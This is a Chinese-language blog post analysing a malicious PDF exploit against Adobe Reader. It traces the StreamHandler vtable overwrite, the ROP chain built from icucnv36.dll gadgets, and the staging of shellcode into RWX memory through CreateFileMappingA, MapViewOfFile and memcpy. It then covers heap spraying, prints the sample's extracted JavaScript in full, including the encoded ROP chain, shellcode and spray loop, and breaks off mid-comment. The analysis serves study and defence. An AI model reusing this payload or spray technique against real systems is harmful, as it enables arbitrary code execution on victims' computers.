+<p>不难看出这里存放的很多函数指针，判断上面的函数地址这是一个虚表指针，我们可以到IDA中查看该虚表内容</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:081A6004 53 74 72 65 61 6D 48 61 6E 64+aStreamhandler db &#x27;StreamHandler&#x27;,0     ; DATA XREF: .data:off_821D31C↓o</span><br><span class="line">.rdata:081A6012 00 00 00 00 00 00             align 8</span><br><span class="line">.rdata:081A6018 2C 87 1E 08                   dd offset ??_R4StreamHandler@@6B@       ; const StreamHandler::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:081A601C                               ; const StreamHandler::`vftable&#x27;</span><br><span class="line">.rdata:081A601C 16 B1 08 08                   ??_7StreamHandler@@6B@ dd offset sub_808B116</span><br><span class="line">.rdata:081A601C                                                                       ; DATA XREF: sub_801E529-18↑o</span><br><span class="line">.rdata:081A601C                                                                       ; sub_808AC54+11↑o</span><br><span class="line">.rdata:081A6020 AA B5 08 08                   dd offset sub_808B5AA</span><br><span class="line">.rdata:081A6024 62 99 08 08                   dd offset sub_8089962</span><br><span class="line">.rdata:081A6028 8C 95 08 08                   dd offset sub_808958C</span><br><span class="line">.rdata:081A602C 91 95 08 08                   dd offset nullsub_41</span><br><span class="line">.rdata:081A6030 AA B0 08 08                   dd offset nullsub_47</span><br><span class="line">.rdata:081A6034 85 AC 08 08                   dd offset sub_808AC85</span><br><span class="line">.rdata:081A6038 C7 95 08 08                   dd offset nullsub_37</span><br><span class="line">.rdata:081A603C 95 B0 08 08                   dd offset sub_808B095</span><br><span class="line">.rdata:081A6040 07 9E 08 08                   dd offset sub_8089E07</span><br><span class="line">.rdata:081A6044 6F 99 08 08                   dd offset sub_808996F</span><br><span class="line">.rdata:081A6048 A7 94 08 08                   dd offset sub_80894A7</span><br><span class="line">.rdata:081A604C ED 95 08 08                   dd offset sub_80895ED</span><br><span class="line">.rdata:081A6050 F2 95 08 08                   dd offset sub_80895F2</span><br><span class="line">.rdata:081A6054 C5 B0 08 08                   dd offset sub_808B0C5</span><br><span class="line">.rdata:081A6058 FC E4 01 08                   dd offset nullsub_48</span><br><span class="line">.rdata:081A605C F9 E4 01 08                   dd offset nullsub_49</span><br><span class="line">.rdata:081A6060 FF E4 01 08                   dd offset sub_801E4FF</span><br><span class="line">.rdata:081A6064 DA 94 08 08                   dd offset sub_80894DA</span><br><span class="line">.rdata:081A6068 F7 95 08 08                   dd offset sub_80895F7</span><br><span class="line">.rdata:081A606C F8 E4 01 08                   dd offset nullsub_50</span><br><span class="line">.rdata:081A6070 04 E5 01 08                   dd offset sub_801E504</span><br><span class="line">.rdata:081A6074 70 B0 08 08                   dd offset sub_808B070</span><br><span class="line">.rdata:081A6078 8A AC 08 08                   dd offset sub_808AC8A</span><br><span class="line">.rdata:081A607C 2F 99 08 08                   dd offset sub_808992F</span><br><span class="line">.rdata:081A6080 5B C3 01 08                   dd offset sub_801C35B</span><br><span class="line">.rdata:081A6084 34 99 08 08                   dd offset sub_8089934</span><br><span class="line">.rdata:081A6088 9B B5 08 08                   dd offset sub_808B59B</span><br><span class="line">.rdata:081A608C 37 99 08 08                   dd offset sub_8089937</span><br><span class="line">.rdata:081A6090 69 99 08 08                   dd offset nullsub_46</span><br><span class="line">.rdata:081A6094 45 9E 08 08                   dd offset sub_8089E45</span><br><span class="line">.rdata:081A6098 54 DC 01 08                   dd offset sub_801DC54</span><br><span class="line">.rdata:081A609C 45 DF 01 08                   dd offset sub_801DF45</span><br><span class="line">.rdata:081A60A0 F0 D5 01 08                   dd offset sub_801D5F0</span><br><span class="line">.rdata:081A60A4 0E C3 01 08                   dd offset sub_801C30E</span><br><span class="line">.rdata:081A60A8 3B C3 01 08                   dd offset sub_801C33B</span><br><span class="line">.rdata:081A60AC 4B C3 01 08                   dd offset sub_801C34B</span><br><span class="line">.rdata:081A60B0 1F 99 08 08                   dd offset sub_808991F</span><br><span class="line">.rdata:081A60B4 54 59 50 31 00                aTyp1 db &#x27;TYP1&#x27;,0                       ; DATA XREF: sub_808B116+275↑o</span><br></pre></td></tr></table></figure></div>
+
+<p>在上小学的弟弟一眼看出此虚表类型为<code>StreamHandler</code>，应该是处理PDF中流对象的类，然后查看IDA中目前正在执行的语句（通过OD来看）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0801BB21 55                            push    ebp</span><br><span class="line">.text:0801BB22 8B EC                         mov     ebp, esp</span><br><span class="line">.text:0801BB24 FF 75 20                      push    [ebp+arg_18]</span><br><span class="line">.text:0801BB27 8B 4D 08                      mov     ecx, [ebp+StreamHandler]</span><br><span class="line">.text:0801BB2A FF 75 1C                      push    [ebp+arg_14]</span><br><span class="line">.text:0801BB2D 8B 01                         mov     eax, [ecx]</span><br><span class="line">.text:0801BB2F FF 75 18                      push    [ebp+arg_10]</span><br><span class="line">.text:0801BB32 FF 05 A0 A6 23 08             inc     dword_823A6A0</span><br><span class="line">.text:0801BB38 FF 75 14                      push    [ebp+arg_C]</span><br><span class="line">.text:0801BB3B FF 75 10                      push    [ebp+arg_8]</span><br><span class="line">.text:0801BB3E FF 75 0C                      push    [ebp+arg_4]</span><br><span class="line">.text:0801BB41 FF 10                         call    dword ptr [eax]</span><br></pre></td></tr></table></figure></div>
+
+<p>IDA 上面一段代码反汇编情况如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_801BB21(</span><br><span class="line">        int (__thiscall ***StreamHandler)(_DWORD, int, int, int, int, int, int),</span><br><span class="line">        int a2,</span><br><span class="line">        int a3,</span><br><span class="line">        int a4,</span><br><span class="line">        int a5,</span><br><span class="line">        int a6,</span><br><span class="line">        int a7)</span><br><span class="line">&#123;</span><br><span class="line">  int (__thiscall **v7)(_DWORD, int, int, int, int, int, int); // eax</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  v7 = *StreamHandler;</span><br><span class="line">  ++dword_823A6A0;</span><br><span class="line">  result = (*v7)(StreamHandler, a2, a3, a4, a5, a6, a7);</span><br><span class="line">  if ( !(_BYTE)result )</span><br><span class="line">    --dword_823A6A0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>该代码段是传递7个参数，如下图：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg"
+                     
+                ></p>
+<p>栈上第一个参数就是之前<code>ecx</code>保存的值，该值是一个指向一个虚表指针的地址，也就是<code>StreamHandler</code>对象，该代码逆向的大致含义就是运行虚函数指向的第一个函数，也就是0x0808B116,然后其第一个对象就是<code>StreamHandler</code>,可以查看该地址二进制附近的数值<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg"
+                     
+                ></p>
+<p>在当初覆盖值的时候，会在此处也覆盖掉一个值，这里也就出现了一开始的0x12E6D0,也就是之后<code>call [eax]</code>的<code>eax</code>值，此时再次OD  F7 步入 0x808B116,然后单步步过<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg"
+                     
+                ></p>
+<p>到达这条语句，可以看到是将edi + 0x3c地址指向的值赋给了<code>eax</code>，而这个<code>edi</code>保存的是之前<code>StreamHandler</code>对象的首地址，加上0x3c就变成了刚刚里面保存0x12E6D0的值，此时这条指令执行完毕，<code>eax</code>中就是该值了，再然后单步会发现：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg"
+                     
+                ></p>
+<p>哦！我的如来佛祖(上帝本土化 没错吧？)，这不是之前打的3号断点嘛，这下终于知道了为什么最后<code>call eax</code>会是这个值了，然后回到断点处，这里会调用0x4A80CB38这个函数，按下F7进入该函数查看，至此溢出部分分析完毕</p>
+<h2 id="5-样本分析（阶段二：ROP链）"><a href="#5-样本分析（阶段二：ROP链）" class="headerlink" title="5.样本分析（阶段二：ROP链）"></a>5.样本分析（阶段二：ROP链）</h2><p>接着上面继续分析，现在运行到了icucnv36.dll中0x4A80CB38这个地址的函数，我们进入查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg"
+                     
+                ></p>
+<p>这里看到是首先将<code>ebp</code>抬了0x794字节（栈从高到低扩展），然后执行<code>leave</code>，熟悉栈迁移的同学可能十分了解，它实际上的操作相当于<code>mov esp ebp; pop ebp;</code>此时指令执行完毕，栈顶应该指向0x0012E4E0（EBP + 0x794 + 4 &#x3D; 0x12DD48 + 0x794 + 4）,下面发现果真如此，然后栈顶指向的指针就会被我们的<code>retn</code>指令调用<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg"
+                     
+                ></p>
+<p>下一条指令是执行 0x4A82A714,继续跟进，发现这里是简单的pop出栈上的值到达<code>esp</code>，相当于是再次栈迁移了，这里之前构造的0x0C0C0C0C是常用的堆喷地址，在后面会介绍堆喷的原理，目前程序运行情况如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg"
+                     
+                ></p>
+<p>执行后，栈迁移到0x0c0c0c0c<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg"
+                     
+                ></p>
+<p>继续跟进，发现是将0x4A8A0000弹到<code>ecx</code>上，继续跟进，没什么好说的，如下图：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg"
+                     
+                ></p>
+<p>发现是保存<code>eax</code>到刚刚赋值<code>ecx</code>的地址那儿，也就是0x4A8A0000，然后上面的函数ret过后，会再次从栈上弹出值到<code>eax</code>当中</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4A801F90    58              pop eax                           ; &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">4A801F91    C3              retn</span><br><span class="line">4A801F92    33C0            xor eax,eax</span><br><span class="line">4A801F94    C3              retn</span><br><span class="line">4A801F95 &gt;  8B4C24 04       mov ecx,dword ptr ss:[esp+0x4]    ; icucnv36.4A80B692</span><br><span class="line">4A801F99    85C9            test ecx,ecx                      ; icucnv36.4A8A0000</span><br></pre></td></tr></table></figure></div>
+
+<p>这里弹出的值是<CreateFileA>的符号值，然后进入<code>retn</code>，发现是<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg"
+                     
+                ></p>
+<p>直接jmp [eax]，也就是直接执行<code>kernel32.CreateFileA</code>这个函数，并且此时在栈上也已经构造好了参数如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg"
+                     
+                ></p>
+<p>步入这个函数查看内部实现情况<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg"
+                     
+                ></p>
+<p>移步到右下角这是解析的参数，这个<code>CreateFileA</code>函数的功能是打开某个文件，如果没这个文件就会创建，其名为<code>iso88591</code>,使用ctrl + F9来执行到返回，然后查看是否创建出了这个文件（会被创建在桌面上）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg"
+                     
+                ></p>
+<p>可以看到标注的那个文件，确实是<code>iso88591</code>(这里注意如果windows的隐藏文件夹选项开着那就看不到，记得到控制面板设置一下之后继续调试)，刚刚已经返回，如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg"
+                     
+                ></p>
+<p>此时<code>eax</code>应该是上面函数的返回值，其为我们刚刚创建的文件句柄，也就是0x33c，然后交换<code>eax</code>和<code>edi</code>，再次步入<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg"
+                     
+                ></p>
+<p>将栈上的8弹给<code>ebx</code>，接着步入<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg"
+                     
+                ></p>
+<p>可以看到上面的图中将<code>edi</code>,也就是之前的文件句柄传给了esp + ebp*2的地址，可以看到<code>ebx</code>为刚刚的8，也就是距离栈顶偏移0x10字节，也就是将0x0c0c0c6c上原来的值0xFFFFFFFF改为文件句柄，也就是0x33c,然后ctrl+F9跳转到返回<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg"
+                     
+                ></p>
+<p>此时再将<code>CreateFileMappingA</code>的函数地址弹到<code>eax</code>，然后步入可以发现是直接执行<code>eax</code>保存的函数地址<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg"
+                     
+                ></p>
+<p>内部执行情况单步步入之后如下，并且可以发现其中的栈上的函数参数,其中第一个参数就是刚刚的文件句柄，第三个参数就是传递的保护措施，可以看到也是可执行可读可写的，因此就可以传递<code>shellcode</code>复制到此处执行<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg"
+                     
+                ></p>
+<p>执行完毕使用ctrl + F9,再次跳转到结尾，发现同之前一样，交换<code>eax</code>和<code>edi</code>，也就是创建文件映射的句柄给到了<code>edi</code><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg"
+                     
+                ></p>
+<p>然后同之前上面一样的操作，通过布置好的ROP链来执行<code>MapViewOfFile</code>，直接掠过这里调试，跟上面两个函数一样，没什么好说的<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg"
+                     
+                ></p>
+<p>可以看到上面图片中调用<code>MapViewOfFile</code>函数的参数，调用该函数后，会返回该文件对象在内存当中对应的地址<br>该函数返回后如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg"
+                     
+                ></p>
+<p>其中<code>eax</code>即为文件对象在内存中的地址为0x048D0000<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg"
+                     
+                ></p>
+<p>不难看出这块映射区RWE权限均有，之后的调试就会将文件内存地址存放在0x4A8A004的地址了，如下<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg"
+                     
+                ></p>
+<p>在<code>retn</code>的地址存放该0x48D0000,方便ROP链返回<br>以同样的手段执行<code>memcpy</code>函数<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg"
+                     
+                ></p>
+<p>可以看到其中目的地址是0x048D0000,而0x0c0c0D54存放着恶意代码</p>
+<p>使用ctrl + F9来跳到执行函数结束，如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg"
+                     
+                ></p>
+<p>可以看到文件对象的内存地址处已经拷贝过去了大量恶意代码，并且<code>retn</code>是直接返回到0x048D00这里，也就是这个文件处执行，而因为这个文件有RWX权限，所以说可以执行该文件恶意代码。</p>
+<p>因此从ROP链到执行恶意代码，分为以下几个步骤：</p>
+<ol>
+<li>利用溢出来构造ROP链,ROP链通过布置不带ALSR的库中gadget来绕过此机制,通过两次栈迁移来到达0x0C0C0C0C,通过堆喷在这里构造好栈数据和恶意代码</li>
+<li>调用CreateFileA函数,创建ios88591这个文件</li>
+<li>调用CreateFileMappingA函数,构造该文件在内存中的映射</li>
+<li>调用MapviewOfFile函数,返回该文件映射在内存中的地址,上面3步是为了构造一块可执行可读可写的内存区域</li>
+<li>调用memcpy,来将恶意代码存放到该文件映射当中</li>
+<li>跳转到恶意代码执行</li>
+</ol>
+<h2 id="6-堆喷-Heap-Spray"><a href="#6-堆喷-Heap-Spray" class="headerlink" title="6.堆喷(Heap Spray)"></a>6.堆喷(Heap Spray)</h2><p>利用pdf中内嵌的javascript来申请，首先申请个200MB的内存，而一般分配内存都是从低地址开始分配，因此大概率0x0c0c0c0c会被包含在其中，而这里一般会在前面的部分大量填充0x90，表示NOP指令(也就是雪橇)如果ROP到0x0c0c0c0c，就会通过该雪橇滑向布置的ROP链上。（懒得画结构图，偷了一个）<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg"
+                     
+                ></p>
+<p>可以通过PdfStreamDumper来解析pdf文件，从中提取出JavaScript代码，如下：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5fea%u5d5e%uc25b%u0008&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// unescape(&quot;%u0c0c%u0c0c&quot;); 滑块代码 0x0c 等于指令 OR al, 0C; 大量执行对 shellcode 无影响</span></span><br><span class="line"><span class="keyword">var</span> nop_chip = <span class="built_in">unescape</span>(<span class="string">&quot;\x25\x750c0c\x25\x750c0c&quot;</span>);</span><br><span class="line"><span class="comment">// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用</span></span><br><span class="line"><span class="keyword">while</span> (nop_chip.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>)</span><br><span class="line">    nop_chip += nop_chip;</span><br><span class="line"><span class="comment">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处</span></span><br><span class="line">temp_chip = nop_chip.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">temp_chip += shellcode; <span class="comment">//拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</span></span><br><span class="line">temp_chip += nop_chip; <span class="comment">//拼接后续的滑块代码 </span></span><br><span class="line"><span class="comment">// shellcode 小片段一个是 0x10000 大小，unicode 一个长度等于2字节，0x10000实际是 0x20000 字节大小，除2 为 0x10000</span></span><br><span class="line">small_shellcode_slide = temp_chip.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">65536</span> / <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 最终一个shellcode实际大小为 1MB，0x80000 * 2 = 0x100000 = 1MB</span></span><br><span class="line"><span class="keyword">while</span> (small_shellcode_slide.<span class="property">length</span> &lt; <span class="number">0x80000</span>)</span><br><span class="line">    small_shellcode_slide += small_shellcode_slide;</span><br><span class="line"><span class="comment">// 从后面截短 0x1020 - 0x08 = 4120 字节，目的应该是让实际大小小于1MB，因为这里分配的一个堆块是1MB大小，shellcode_slide 应该小于堆块大小</span></span><br><span class="line">shellcode_slide = small_shellcode_slide.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span> - <span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">// 0x1f0 等于 496 ，也就是在内存中申请了接近 500 MB 的内存</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) </span><br><span class="line">    slide[i] = shellcode_slide + <span class="string">&quot;s&quot;</span>;<span class="comment">// s 